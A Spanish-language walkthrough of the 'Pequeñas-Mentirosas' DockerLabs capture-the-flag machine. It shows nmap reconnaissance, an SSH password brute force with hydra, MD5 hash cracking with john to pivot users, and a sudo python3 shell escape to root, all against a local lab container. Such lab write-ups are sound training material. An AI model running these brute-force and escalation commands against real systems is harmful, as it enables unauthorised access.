# Pequeñas-Mentirosas — DockerLabs.es 🐳

<img width="552" height="302" alt="1" src="https://github.com/user-attachments/assets/a02aa3a9-b06a-4bbc-bb42-22c5c9313dcc" />

**Plataforma**: DockerLabs | **OS**: Linux | **Dificultad**: Fácil

---

## 1. Reconocimiento

Comenzamos haciendo un escaneo con nmap:

```bash
sudo nmap -p- --open --min-rate 2000 -A -sS -n -Pn 172.17.0.2 -oN escaneo.txt
```

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-24 23:32 EDT
Nmap scan report for 172.17.0.2
Host is up (0.000059s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey:
|   256 9e:10:58:a5:1a:42:9d:be:e5:19:d1:2e:79:9c:ce:21 (ECDSA)
|_  256 6b:a3:a8:84:e0:33:57:fc:44:49:69:41:7d:d3:c9:92 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.06 ms 172.17.0.2

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.96 seconds
```

Tenemos los puertos 22 y 80 abiertos, por lo que vamos a investigar que contiene el servidor web en la ip 172.17.0.2

<img width="868" height="268" alt="2" src="https://github.com/user-attachments/assets/27a5e6dd-9b09-4dc2-aa29-95770a8d5342" />


Nos dice que hay alguien que se llama “a” lo cuál tiene sentido porque “a” es un personaje de la serie.


---

## 2. Explotación

Le realizaremos un ataque de fuerza bruta a ese usuario con hydra de la siguiente forma:

```bash
hydra -l a -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 
```

<img width="1344" height="274" alt="3" src="https://github.com/user-attachments/assets/bf33070e-37da-4ff8-9fe9-8de922c981c0" />


Y obtenemos la contraseña “secret”

Ingresamos mediante el protocolo SSH:

```bash
ssh a@172.17.0.2 
password: secret
```

Una vez dentro, si vamos al directorio /home podemos ver dos usuarios: “a” y “spencer”

<img width="500" height="192" alt="4" src="https://github.com/user-attachments/assets/361c5d1d-f270-4071-908e-dcbba78822e9" />

Por lo que tenemos que hacer un pivoting al usuario “spencer”, para ello vamos al directorio /srv/ftp/ 

Y si le hacemos un ls -la podemos ver un listado de archivos que al parece contienen hashes.

Hacemos un cat a “hash_spencer.txt” ya que tenemos un usuario con ese nombre y nos dará un hash en MD5

<img width="548" height="379" alt="5" src="https://github.com/user-attachments/assets/21be9edd-c9f5-4f6b-a9f6-b240f063b0a9" />

Copio y pego ese hash en un archivo llamado “spencer” y le hacemos un crackeo de contraseña con john de la siguiente forma:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt spencer --format=Raw-MD5
```

<img width="736" height="182" alt="6" src="https://github.com/user-attachments/assets/b55bd576-fa07-4aa2-8120-f18ef2a3cf6e" />

Luego procedemos a pivotar al usuario spencer con la contraseña “password1”

---

## 3. Escalada de Privilegios

Una vez dentro, hacemos un sudo -l y podemos ejecutar el binario python3 como super usuario con cualquier usuario

<img width="942" height="257" alt="7" src="https://github.com/user-attachments/assets/82dfee77-f2f9-4520-892b-aaaf5bf96c90" />

Ejecutamos el siguiente comando:

```bash
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```

Y así conseguimos rootear la máquina

<img width="726" height="129" alt="8" src="https://github.com/user-attachments/assets/552d1ea0-0a97-4e7f-aaab-917349e63fd9" />


**✅ Máquina rooteada con éxito.**
